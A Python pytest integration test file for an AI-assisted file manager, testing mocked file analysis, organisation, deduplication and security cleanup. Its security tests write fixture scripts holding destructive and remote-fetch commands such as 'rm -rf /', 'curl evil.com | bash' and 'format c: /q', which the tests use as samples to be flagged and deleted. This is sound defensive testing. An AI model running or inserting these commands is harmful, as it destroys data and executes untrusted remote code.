"""
Integration tests for AI system integration

Tests the integration between AI assistant, file manager, and UI components
for AI-powered file analysis and automation workflows.
"""

import pytest
import asyncio
import json
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
from datetime import datetime

from laxyfile.ai.advanced_assistant import AdvancedAIAssistant, AnalysisType, AnalysisResult
from laxyfile.core.advanced_file_manager import AdvancedFileManager
from laxyfile.ui.superfile_ui import SuperFileUI
from laxyfile.operations.file_ops import ComprehensiveFileOperations


@pytest.mark.integration
class TestAIFileManagerIntegration:
    """Test integration between AI assistant and file manager"""

    @pytest.fixture
    def ai_system(self, mock_config, temp_dir):
        """Create integrated AI system"""
        # Mock AI configuration
        ai_config = {
            'ai_models': {
                'test_model': {
                    'provider': 'openrouter',
                    'model_name': 'test/model',
                    'api_key': 'test_key',
                    'capabilities': ['text_analysis', 'security_analysis', 'code_analysis']
                }
            },
            'cache_size': 100,
            'cache_ttl': 3600,
            'max_analysis_history': 100
        }

        with patch('laxyfile.ai.advanced_assistant.AIModelManager._test_model_availability', return_value=True):
            ai_assistant = AdvancedAIAssistant(ai_config)
            file_manager = AdvancedFileManager(mock_config)

            return {
                'ai_assistant': ai_assistant,
                'file_manager': file_manager,
                'temp_dir': temp_dir
            }

    @pytest.mark.asyncio
    async def test_file_analysis_workflow(self, ai_system, sample_files):
        """Test complete file analysis workflow"""
        ai_assistant = ai_system['ai_assistant']
        file_manager = ai_system['file_manager']

        # Step 1: Get file info using file manager
        text_file = sample_files['text_file']
        file_info = await file_manager.get_file_info(text_file)
        assert file_info.name == "readme.txt"

        # Step 2: Mock AI response
        mock_response = json.dumps({
            "summary": "Sample text file analysis",
            "file_type": "text",
            "quality_score": 0.8,
            "insights": ["Well-structured content", "Clear documentation"],
            "suggestions": ["Add more examples", "Include version info"],
            "confidence": 0.9
        })

        with patch.object(ai_assistant, '_call_model', return_value=mock_response):
            # Step 3: Perform AI analysis
            results = await ai_assistant.analyze_file_comprehensive(
                text_file, [AnalysisType.CONTENT]
            )

            # Step 4: Verify analysis results
            assert len(results) == 1
            result = results[0]
            assert isinstance(result, AnalysisResult)
            assert result.file_path == text_file
            assert result.analysis_type == AnalysisType.CONTENT
            assert result.confidence == 0.9

        # Step 5: Verify analysis history
        history = ai_assistant.get_analysis_history()
        assert len(history) == 1
        assert history[0].file_path == text_file    @p
ytest.mark.asyncio
    async def test_directory_analysis_integration(self, ai_system, sample_files):
        """Test AI analysis of entire directories"""
        ai_assistant = ai_system['ai_assistant']
        file_manager = ai_system['file_manager']
        temp_dir = ai_system['temp_dir']

        # Step 1: List directory using file manager
        files = await file_manager.list_directory(temp_dir)
        text_files = [f for f in files if f.name.endswith('.txt')]
        assert len(text_files) > 0

        # Step 2: Mock AI responses for multiple files
        mock_responses = []
        for i, file_info in enumerate(text_files):
            mock_response = json.dumps({
                "summary": f"Analysis of {file_info.name}",
                "file_type": "text",
                "quality_score": 0.7 + (i * 0.1),
                "insights": [f"Insight for {file_info.name}"],
                "suggestions": [f"Suggestion for {file_info.name}"],
                "confidence": 0.8
            })
            mock_responses.append(mock_response)

        with patch.object(ai_assistant, '_call_model', side_effect=mock_responses):
            # Step 3: Analyze all text files
            analysis_tasks = []
            for file_info in text_files:
                task = ai_assistant.analyze_file_comprehensive(
                    file_info.path, [AnalysisType.CONTENT]
                )
                analysis_tasks.append(task)

            all_results = await asyncio.gather(*analysis_tasks)

            # Step 4: Verify all analyses completed
            assert len(all_results) == len(text_files)
            for results in all_results:
                assert len(results) == 1
                assert isinstance(results[0], AnalysisResult)

        # Step 5: Verify analysis history contains all files
        history = ai_assistant.get_analysis_history()
        analyzed_paths = [result.file_path for result in history]
        for file_info in text_files:
            assert file_info.path in analyzed_paths

    @pytest.mark.asyncio
    async def test_ai_file_organization_integration(self, ai_system):
        """Test AI-powered file organization suggestions"""
        ai_assistant = ai_system['ai_assistant']
        file_manager = ai_system['file_manager']
        temp_dir = ai_system['temp_dir']

        # Step 1: Create diverse file types
        test_files = []
        file_types = [
            ("document.pdf", "document"),
            ("image.jpg", "image"),
            ("script.py", "code"),
            ("data.csv", "data"),
            ("presentation.pptx", "document")
        ]

        for filename, file_type in file_types:
            test_file = temp_dir / filename
            test_file.write_text(f"Sample {file_type} content")
            test_files.append((test_file, file_type))

        # Step 2: Get file info for all files
        file_infos = []
        for test_file, _ in test_files:
            file_info = await file_manager.get_file_info(test_file)
            file_infos.append(file_info)

        # Step 3: Mock AI organization suggestions
        organization_responses = []
        for test_file, file_type in test_files:
            mock_response = json.dumps({
                "suggested_category": file_type,
                "folder_structure": [f"{file_type}s", "archive"],
                "naming_suggestions": [f"organized_{test_file.name}"],
                "tags": [file_type, "sample"],
                "cleanup_action": "keep",
                "confidence": 0.85
            })
            organization_responses.append(mock_response)

        with patch.object(ai_assistant, '_call_model', side_effect=organization_responses):
            # Step 4: Get organization suggestions for all files
            organization_tasks = []
            for test_file, _ in test_files:
                task = ai_assistant.analyze_file_comprehensive(
                    test_file, [AnalysisType.ORGANIZATION]
                )
                organization_tasks.append(task)

            organization_results = await asyncio.gather(*organization_tasks)

            # Step 5: Verify organization suggestions
            assert len(organization_results) == len(test_files)

            categories = []
            for results in organization_results:
                assert len(results) == 1
                result = results[0]
                assert result.analysis_type == AnalysisType.ORGANIZATION

                # Extract suggested category from results
                if 'suggested_category' in result.results:
                    categories.append(result.results['suggested_category'])

            # Should have suggestions for different file types
            expected_categories = ["document", "image", "code", "data"]
            for category in expected_categories:
                assert category in categories

    @pytest.mark.asyncio
    async def test_ai_security_analysis_integration(self, ai_system):
        """Test AI security analysis integration"""
        ai_assistant = ai_system['ai_assistant']
        file_manager = ai_system['file_manager']
        temp_dir = ai_system['temp_dir']

        # Step 1: Create files with potential security issues
        security_test_files = [
            ("script.sh", "#!/bin/bash\nrm -rf /", "high"),
            ("config.txt", "password=admin123\napi_key=secret", "medium"),
            ("normal.txt", "This is normal content", "low")
        ]

        created_files = []
        for filename, content, risk_level in security_test_files:
            test_file = temp_dir / filename
            test_file.write_text(content)
            created_files.append((test_file, risk_level))

        # Step 2: Get file info using file manager
        file_infos = []
        for test_file, _ in created_files:
            file_info = await file_manager.get_file_info(test_file)
            file_infos.append(file_info)

        # Step 3: Mock AI security analysis responses
        security_responses = []
        for test_file, risk_level in created_files:
            if risk_level == "high":
                mock_response = json.dumps({
                    "risk_level": "high",
                    "vulnerabilities": ["Dangerous command execution", "File system manipulation"],
                    "suspicious_patterns": ["rm -rf", "destructive commands"],
                    "privacy_issues": [],
                    "recommendations": ["Review script carefully", "Restrict execution permissions"],
                    "confidence": 0.95
                })
            elif risk_level == "medium":
                mock_response = json.dumps({
                    "risk_level": "medium",
                    "vulnerabilities": ["Hardcoded credentials"],
                    "suspicious_patterns": ["password=", "api_key="],
                    "privacy_issues": ["Exposed credentials"],
                    "recommendations": ["Use environment variables", "Encrypt sensitive data"],
                    "confidence": 0.9
                })
            else:
                mock_response = json.dumps({
                    "risk_level": "low",
                    "vulnerabilities": [],
                    "suspicious_patterns": [],
                    "privacy_issues": [],
                    "recommendations": ["File appears safe"],
                    "confidence": 0.8
                })
            security_responses.append(mock_response)

        with patch.object(ai_assistant, '_call_model', side_effect=security_responses):
            # Step 4: Perform security analysis
            security_tasks = []
            for test_file, _ in created_files:
                task = ai_assistant.analyze_file_comprehensive(
                    test_file, [AnalysisType.SECURITY]
                )
                security_tasks.append(task)

            security_results = await asyncio.gather(*security_tasks)

            # Step 5: Verify security analysis results
            assert len(security_results) == len(created_files)

            risk_levels = []
            for results in security_results:
                assert len(results) == 1
                result = results[0]
                assert result.analysis_type == AnalysisType.SECURITY

                if 'risk_level' in result.results:
                    risk_levels.append(result.results['risk_level'])

            # Should detect different risk levels
            assert "high" in risk_levels
            assert "medium" in risk_levels
            assert "low" in risk_levels

    @pytest.mark.asyncio
    async def test_ai_caching_integration(self, ai_system, sample_files):
        """Test AI response caching integration"""
        ai_assistant = ai_system['ai_assistant']
        file_manager = ai_system['file_manager']

        # Step 1: Get file info
        text_file = sample_files['text_file']
        file_info = await file_manager.get_file_info(text_file)

        # Step 2: Mock AI response
        mock_response = json.dumps({
            "summary": "Cached analysis result",
            "confidence": 0.9
        })

        with patch.object(ai_assistant, '_call_model', return_value=mock_response) as mock_call:
            # Step 3: First analysis call
            results1 = await ai_assistant.analyze_file_comprehensive(
                text_file, [AnalysisType.CONTENT]
            )
            assert len(results1) == 1
            assert mock_call.call_count == 1

            # Step 4: Second analysis call (should use cache)
            results2 = await ai_assistant.analyze_file_comprehensive(
                text_file, [AnalysisType.CONTENT]
            )
            assert len(results2) == 1
            # Should not make additional API call due to caching
            assert mock_call.call_count == 1

            # Step 5: Verify cache hit statistics
            stats = ai_assistant.get_performance_stats()
            assert stats['cache_hits'] >= 1


@pytest.mark.integration
class TestAIUIIntegration:
    """Test integration between AI assistant and UI components"""

    @pytest.fixture
    def ai_ui_system(self, mock_config, theme_manager, console):
        """Create integrated AI-UI system"""
        ai_config = {
            'ai_models': {
                'test_model': {
                    'provider': 'openrouter',
                    'model_name': 'test/model',
                    'api_key': 'test_key',
                    'capabilities': ['text_analysis']
                }
            },
            'cache_size': 100,
            'cache_ttl': 3600
        }

        with patch('laxyfile.ai.advanced_assistant.AIModelManager._test_model_availability', return_value=True):
            ai_assistant = AdvancedAIAssistant(ai_config)
            ui = SuperFileUI(theme_manager, console, mock_config)

            return {
                'ai_assistant': ai_assistant,
                'ui': ui
            }

    @pytest.mark.asyncio
    async def test_ai_status_display_integration(self, ai_ui_system, sample_files):
        """Test AI status display in UI"""
        ai_assistant = ai_ui_system['ai_assistant']
        ui = ai_ui_system['ui']

        # Step 1: Mock AI analysis in progress
        mock_response = json.dumps({"summary": "Analysis complete", "confidence": 0.9})

        with patch.object(ai_assistant, '_call_model', return_value=mock_response):
            # Step 2: Start AI analysis (simulate)
            analysis_task = ai_assistant.analyze_file_comprehensive(
                sample_files['text_file'], [AnalysisType.CONTENT]
            )

            # Step 3: Create status data with AI status
            from laxyfile.core.types import StatusData, EnhancedFileInfo
            status_data = StatusData(
                current_file=EnhancedFileInfo(
                    path=sample_files['text_file'],
                    name="readme.txt",
                    size=1024,
                    modified=datetime.now(),
                    is_dir=False,
                    is_symlink=False,
                    file_type="text"
                ),
                selected_count=0,
                total_files=1,
                total_size=1024,
                operation_status="",
                ai_status="Analyzing file..."
            )

            # Step 4: Render footer with AI status
            footer = ui.render_footer(status_data)
            footer_content = str(footer)
            assert "🤖 Analyzing file..." in footer_content

            # Step 5: Complete analysis and update status
            results = await analysis_task
            assert len(results) == 1

            # Update status to show completion
            status_data.ai_status = "Analysis complete"
            footer_complete = ui.render_footer(status_data)
            footer_complete_content = str(footer_complete)
            assert "🤖 Analysis complete" in footer_complete_content

    def test_ai_progress_dialog_integration(self, ai_ui_system):
        """Test AI progress dialog rendering"""
        ui = ai_ui_system['ui']

        # Step 1: Create progress dialog for AI operation
        progress_dialog = ui.render_progress_dialog(
            operation="AI Analysis",
            progress=65.5,
            current_file="document.pdf",
            speed="Processing..."
        )

        # Step 2: Verify dialog content
        dialog_content = str(progress_dialog)
        assert "AI Analysis" in dialog_content
        assert "document.pdf" in dialog_content
        assert "Processing..." in dialog_content

    @pytest.mark.asyncio
    async def test_ai_results_display_integration(self, ai_ui_system, sample_files):
        """Test displaying AI analysis results in UI"""
        ai_assistant = ai_ui_system['ai_assistant']
        ui = ai_ui_system['ui']

        # Step 1: Mock comprehensive AI analysis
        mock_response = json.dumps({
            "summary": "Comprehensive file analysis completed",
            "file_type": "text",
            "quality_score": 0.85,
            "insights": [
                "Well-structured documentation",
                "Clear and concise content",
                "Good use of examples"
            ],
            "suggestions": [
                "Add table of contents",
                "Include more code examples",
                "Update version information"
            ],
            "confidence": 0.92
        })

        with patch.object(ai_assistant, '_call_model', return_value=mock_response):
            # Step 2: Perform AI analysis
            results = await ai_assistant.analyze_file_comprehensive(
                sample_files['text_file'], [AnalysisType.CONTENT]
            )

            # Step 3: Create modal dialog to display results
            from rich.text import Text
            from rich.panel import Panel

            result = results[0]
            result_text = Text()
            result_text.append(f"Analysis Summary: {result.results.get('summary', 'N/A')}\n", style="bold")
            result_text.append(f"Confidence: {result.confidence:.1%}\n", style="cyan")
            result_text.append(f"Quality Score: {result.results.get('quality_score', 0):.1%}\n", style="green")

            if 'insights' in result.results:
                result_text.append("\nInsights:\n", style="bold yellow")
                for insight in result.results['insights']:
                    result_text.append(f"• {insight}\n", style="white")

            if 'suggestions' in result.results:
                result_text.append("\nSuggestions:\n", style="bold blue")
                for suggestion in result.results['suggestions']:
                    result_text.append(f"• {suggestion}\n", style="white")

            result_panel = Panel(result_text, title="AI Analysis Results")
            modal = ui.create_modal_overlay(result_panel, "AI Analysis")

            # Step 4: Verify modal content
            assert modal is not None
            modal_content = str(modal)
            assert "Analysis Summary" in modal_content
            assert "Confidence" in modal_content
            assert "Well-structured documentation" in modal_content


@pytest.mark.integration
class TestAIOperationsIntegration:
    """Test integration between AI assistant and file operations"""

    @pytest.fixture
    def ai_ops_system(self, mock_config):
        """Create integrated AI-operations system"""
        ai_config = {
            'ai_models': {
                'test_model': {
                    'provider': 'openrouter',
                    'model_name': 'test/model',
                    'api_key': 'test_key',
                    'capabilities': ['organization_analysis']
                }
            },
            'cache_size': 100,
            'cache_ttl': 3600
        }

        with patch('laxyfile.ai.advanced_assistant.AIModelManager._test_model_availability', return_value=True):
            ai_assistant = AdvancedAIAssistant(ai_config)
            file_operations = ComprehensiveFileOperations(mock_config)

            return {
                'ai_assistant': ai_assistant,
                'file_operations': file_operations
            }

    @pytest.mark.asyncio
    async def test_ai_guided_organization(self, ai_ops_system, temp_dir):
        """Test AI-guided file organization workflow"""
        ai_assistant = ai_ops_system['ai_assistant']
        file_operations = ai_ops_system['file_operations']

        # Step 1: Create mixed file types
        test_files = []
        file_data = [
            ("report.pdf", "document", "documents"),
            ("photo.jpg", "image", "images"),
            ("script.py", "code", "code"),
            ("data.csv", "data", "data")
        ]

        for filename, file_type, suggested_folder in file_data:
            test_file = temp_dir / filename
            test_file.write_text(f"Sample {file_type} content")
            test_files.append((test_file, file_type, suggested_folder))

        # Step 2: Mock AI organization suggestions
        organization_responses = []
        for test_file, file_type, suggested_folder in test_files:
            mock_response = json.dumps({
                "suggested_category": file_type,
                "folder_structure": [suggested_folder],
                "naming_suggestions": [f"organized_{test_file.name}"],
                "tags": [file_type],
                "cleanup_action": "keep",
                "confidence": 0.9
            })
            organization_responses.append(mock_response)

        with patch.object(ai_assistant, '_call_model', side_effect=organization_responses):
            # Step 3: Get AI organization suggestions
            organization_tasks = []
            for test_file, _, _ in test_files:
                task = ai_assistant.analyze_file_comprehensive(
                    test_file, [AnalysisType.ORGANIZATION]
                )
                organization_tasks.append(task)

            organization_results = await asyncio.gather(*organization_tasks)

            # Step 4: Create directories based on AI suggestions and move files
            created_dirs = set()
            move_operations = []

            for i, (test_file, _, expected_folder) in enumerate(test_files):
                results = organization_results[i]
                if results and len(results) > 0:
                    result = results[0]
                    if 'folder_structure' in result.results:
                        suggested_folders = result.results['folder_structure']
                        if suggested_folders:
                            target_folder = suggested_folders[0]
                            target_dir = temp_dir / target_folder

                            # Create directory if it doesn't exist
                            if target_folder not in created_dirs:
                                target_dir.mkdir(exist_ok=True)
                                created_dirs.add(target_folder)

                            # Prepare move operation
                            move_operations.append((test_file, target_dir))

            # Step 5: Execute file moves based on AI suggestions
            for source_file, target_dir in move_operations:
                progress_callback = Mock()
                result = await file_operations.move_files([source_file], target_dir, progress_callback)
                assert result.success is True

            # Step 6: Verify files were organized correctly
            for test_file, _, expected_folder in test_files:
                expected_location = temp_dir / expected_folder / test_file.name
                assert expected_location.exists()
                assert not test_file.exists()  # Original should be moved

    @pytest.mark.asyncio
    async def test_ai_duplicate_detection_integration(self, ai_ops_system, temp_dir):
        """Test AI-powered duplicate detection and cleanup"""
        ai_assistant = ai_ops_system['ai_assistant']
        file_operations = ai_ops_system['file_operations']

        # Step 1: Create duplicate files
        original_content = "This is the original content for duplicate testing"
        duplicate_files = []

        for i in range(3):
            duplicate_file = temp_dir / f"duplicate_{i}.txt"
            duplicate_file.write_text(original_content)
            duplicate_files.append(duplicate_file)

        # Create one unique file
        unique_file = temp_dir / "unique.txt"
        unique_file.write_text("This is unique content")

        # Step 2: Mock AI duplicate analysis
        duplicate_responses = []
        for i, duplicate_file in enumerate(duplicate_files):
            mock_response = json.dumps({
                "content_fingerprint": "duplicate_content_hash_123",
                "duplicate_indicators": ["identical_content", "same_size"],
                "similarity_patterns": ["exact_match"],
                "uniqueness_score": 0.0 if i > 0 else 1.0,  # First file is original
                "dedup_strategy": "keep_first" if i == 0 else "remove_duplicate",
                "confidence": 0.95
            })
            duplicate_responses.append(mock_response)

        # Mock response for unique file
        unique_response = json.dumps({
            "content_fingerprint": "unique_content_hash_456",
            "duplicate_indicators": [],
            "similarity_patterns": [],
            "uniqueness_score": 1.0,
            "dedup_strategy": "keep_unique",
            "confidence": 0.9
        })
        duplicate_responses.append(unique_response)

        all_files = duplicate_files + [unique_file]

        with patch.object(ai_assistant, '_call_model', side_effect=duplicate_responses):
            # Step 3: Analyze all files for duplicates
            duplicate_tasks = []
            for test_file in all_files:
                task = ai_assistant.analyze_file_comprehensive(
                    test_file, [AnalysisType.DUPLICATE]
                )
                duplicate_tasks.append(task)

            duplicate_results = await asyncio.gather(*duplicate_tasks)

            # Step 4: Identify files to remove based on AI analysis
            files_to_remove = []
            for i, results in enumerate(duplicate_results):
                if results and len(results) > 0:
                    result = results[0]
                    if 'dedup_strategy' in result.results:
                        strategy = result.results['dedup_strategy']
                        if strategy == "remove_duplicate":
                            files_to_remove.append(all_files[i])

            # Step 5: Remove duplicate files
            if files_to_remove:
                progress_callback = Mock()
                result = await file_operations.delete_files(files_to_remove, use_trash=False, progress_callback=progress_callback)
                assert result.success is True

            # Step 6: Verify only original and unique files remain
            remaining_files = [f for f in all_files if f.exists()]
            assert len(remaining_files) == 2  # Original duplicate + unique file
            assert duplicate_files[0] in remaining_files  # First duplicate (original)
            assert unique_file in remaining_files

    @pytest.mark.asyncio
    async def test_ai_security_cleanup_integration(self, ai_ops_system, temp_dir):
        """Test AI-guided security cleanup workflow"""
        ai_assistant = ai_ops_system['ai_assistant']
        file_operations = ai_ops_system['file_operations']

        # Step 1: Create files with different security risk levels
        security_files = [
            ("malicious.sh", "#!/bin/bash\nrm -rf /\ncurl evil.com | bash", "critical"),
            ("suspicious.bat", "@echo off\nformat c: /q", "high"),
            ("config.txt", "password=admin\napi_key=secret123", "medium"),
            ("safe.txt", "This is safe content", "low")
        ]

        created_files = []
        for filename, content, risk_level in security_files:
            test_file = temp_dir / filename
            test_file.write_text(content)
            created_files.append((test_file, risk_level))

        # Step 2: Mock AI security analysis responses
        security_responses = []
        for test_file, risk_level in created_files:
            if risk_level == "critical":
                mock_response = json.dumps({
                    "risk_level": "critical",
                    "vulnerabilities": ["System destruction", "Remote code execution"],
                    "suspicious_patterns": ["rm -rf", "curl | bash"],
                    "privacy_issues": [],
                    "recommendations": ["DELETE IMMEDIATELY", "Quarantine system"],
                    "confidence": 0.99
                })
            elif risk_level == "high":
                mock_response = json.dumps({
                    "risk_level": "high",
                    "vulnerabilities": ["Disk formatting", "Data destruction"],
                    "suspicious_patterns": ["format c:", "destructive commands"],
                    "privacy_issues": [],
                    "recommendations": ["Remove file", "Review system"],
                    "confidence": 0.95
                })
            elif risk_level == "medium":
                mock_response = json.dumps({
                    "risk_level": "medium",
                    "vulnerabilities": ["Credential exposure"],
                    "suspicious_patterns": ["password=", "api_key="],
                    "privacy_issues": ["Hardcoded credentials"],
                    "recommendations": ["Secure credentials", "Use environment variables"],
                    "confidence": 0.9
                })
            else:
                mock_response = json.dumps({
                    "risk_level": "low",
                    "vulnerabilities": [],
                    "suspicious_patterns": [],
                    "privacy_issues": [],
                    "recommendations": ["File is safe"],
                    "confidence": 0.8
                })
            security_responses.append(mock_response)

        with patch.object(ai_assistant, '_call_model', side_effect=security_responses):
            # Step 3: Perform security analysis
            security_tasks = []
            for test_file, _ in created_files:
                task = ai_assistant.analyze_file_comprehensive(
                    test_file, [AnalysisType.SECURITY]
                )
                security_tasks.append(task)

            security_results = await asyncio.gather(*security_tasks)

            # Step 4: Identify high-risk files for removal
            high_risk_files = []
            for i, results in enumerate(security_results):
                if results and len(results) > 0:
                    result = results[0]
                    if 'risk_level' in result.results:
                        risk_level = result.results['risk_level']
                        if risk_level in ['critical', 'high']:
                            high_risk_files.append(created_files[i][0])

            # Step 5: Remove high-risk files
            if high_risk_files:
                progress_callback = Mock()
                result = await file_operations.delete_files(high_risk_files, use_trash=False, progress_callback=progress_callback)
                assert result.success is True

            # Step 6: Verify only safe files remain
            remaining_files = [f for f, _ in created_files if f.exists()]
            assert len(remaining_files) == 2  # Medium and low risk files

            # High-risk files should be removed
            for test_file, risk_level in created_files:
                if risk_level in ['critical', 'high']:
                    assert not test_file.exists()
                else:
                    assert test_file.exists()